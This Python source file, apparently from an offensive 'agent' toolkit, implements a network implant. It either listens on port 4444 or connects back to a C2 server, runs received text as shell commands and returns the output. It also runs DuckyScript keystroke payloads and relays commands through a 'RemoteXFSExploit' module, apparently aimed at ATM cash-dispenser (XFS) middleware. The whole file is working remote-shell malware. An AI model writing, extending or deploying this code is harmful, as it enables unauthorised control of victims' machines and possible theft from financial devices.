"""Network-based payload delivery (TCP server or reverse shell) with XFS support."""

from __future__ import annotations

import logging
import socket
import subprocess
import threading
from pathlib import Path
from typing import Optional

from agent.offensive.ducky import DuckyRunner
from agent.state import AgentState

logger = logging.getLogger(__name__)


class NetworkDelivery:
    """
    Replace USB gadget/HID with TCP socket communication.
    Mode 'server': listens for incoming commands.
    Mode 'reverse': connects back to a C2 server.
    Commands can be shell commands, 'DUCKY:/path/to/script' to run DuckyScript,
    or 'XFS:<ip>:<port>:<command>' for remote XFS execution.
    """

    def __init__(
        self,
        state: AgentState,
        mode: str = "server",
        port: int = 4444,
        server_host: str = "0.0.0.0",
        reverse_host: Optional[str] = None,
    ) -> None:
        self.state = state
        self.mode = mode
        self.port = port
        self.server_host = server_host
        self.reverse_host = reverse_host
        self._stop = threading.Event()
        self._conn: Optional[socket.socket] = None
        self._ducky = DuckyRunner()

    def start(self) -> None:
        if self.mode == "server":
            threading.Thread(target=self._server_loop, daemon=True).start()
        elif self.mode == "reverse" and self.reverse_host:
            threading.Thread(target=self._reverse_loop, daemon=True).start()
        else:
            logger.warning("network delivery not started: invalid config")

    def stop(self) -> None:
        self._stop.set()
        if self._conn:
            try:
                self._conn.close()
            except Exception:
                pass

    def send_payload(self, payload: Path) -> None:
        """Send a payload file (raw bytes) over the active connection."""
        if self._conn and payload.exists():
            try:
                data = payload.read_bytes()
                self._conn.sendall(data + b"\n")
            except Exception as e:
                logger.debug("send_payload failed: %s", e)

    def _server_loop(self) -> None:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((self.server_host, self.port))
            s.listen(1)
            self.state.push_log(f"net server listening on {self.port}")
            while not self._stop.is_set():
                try:
                    conn, addr = s.accept()
                    self._conn = conn
                    self.state.push_log(f"incoming from {addr}")
                    with conn:
                        while not self._stop.is_set():
                            try:
                                data = conn.recv(4096)
                                if not data:
                                    break
                                self._execute_command(data.decode(errors="ignore"))
                            except socket.error:
                                break
                except Exception as e:
                    if not self._stop.is_set():
                        self.state.push_log(f"net error: {e}")
                    break

    def _reverse_loop(self) -> None:
        while not self._stop.is_set():
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((self.reverse_host, self.port))
                    self._conn = s
                    self.state.push_log("reverse connected")
                    while not self._stop.is_set():
                        try:
                            data = s.recv(4096)
                            if not data:
                                break
                            self._execute_command(data.decode(errors="ignore"))
                        except socket.error:
                            break
            except Exception as e:
                self.state.push_log(f"reverse reconnect: {e}")
                self._stop.wait(timeout=10)

    def _execute_command(self, cmd: str) -> None:
        cmd = cmd.strip()
        if not cmd:
            return
        # Handle XFS remote command
        if cmd.startswith("XFS:"):
            parts = cmd.split(":", 4)
            if len(parts) >= 4:
                target_ip = parts[1]
                try:
                    port = int(parts[2])
                except ValueError:
                    port = 7777
                command = parts[3] if len(parts) > 3 else "cdm status"
                result = self._execute_xfs_remote(target_ip, port, command)
                self.state.push_log(f"XFS result: {result[:80]}...")
                if self._conn:
                    try:
                        self._conn.sendall((result + "\n").encode())
                    except:
                        pass
                return
        # Handle DuckyScript
        if cmd.startswith("DUCKY:"):
            path = Path(cmd.split(":", 1)[1].strip())
            if path.exists():
                self._ducky.run_file(path)
                self.state.push_log(f"network ran ducky {path.name}")
            else:
                self.state.push_log(f"network ducky file not found: {path}")
            return
        # Execute as shell command
        try:
            result = subprocess.run(cmd, shell=True, timeout=30, capture_output=True, text=True)
            output = (result.stdout + result.stderr).strip()
            if output:
                self.state.push_log(f"net exec: {output[:80]}")
            if self._conn:
                self._conn.sendall((output + "\n").encode())
        except Exception as e:
            self.state.push_log(f"net exec error: {e}")

    def _execute_xfs_remote(self, target_ip: str, port: int, command: str) -> str:
        """Execute XFS command remotely, fallback to xfsc if available."""
        try:
            # Try to use network_xfs module if available
            from network_xfs import RemoteXFSExploit
            exploit = RemoteXFSExploit()
            return exploit.execute_remote_command(target_ip, port, command)
        except ImportError:
            # Fallback: use xfsc with network parameters
            try:
                xfsc = "xfsc.exe"  # adjust path if needed
                cmd = f"{xfsc} -c '{command}' --host {target_ip} --port {port}"
                result = subprocess.run(cmd, shell=True, timeout=10, capture_output=True, text=True)
                return result.stdout if result.stdout else result.stderr
            except Exception as e:
                return f"XFS fallback error: {e}"
